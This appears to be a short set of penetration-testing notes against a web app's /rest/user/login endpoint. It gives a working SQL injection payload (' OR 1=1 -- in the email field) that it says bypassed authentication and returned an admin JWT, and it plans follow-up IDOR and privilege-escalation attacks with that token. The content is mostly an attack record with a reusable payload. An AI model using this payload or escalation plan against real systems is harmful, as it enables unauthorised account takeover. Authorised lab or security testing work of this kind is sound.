# Auth Bypass & SQLi Payloads

## Target: /rest/user/login

### SQL Injection (Auth Bypass)
Payload: `{"email": "' OR 1=1 --", "password": "password"}`
Result: Successful authentication as admin (JWT retrieved).

## Notes
- The application is vulnerable to SQL injection in the login field.
- The backend is Express ^4.22.1.
- JWTs are issued upon successful login.
- Future testing should focus on IDOR and privilege escalation using the obtained admin JWT.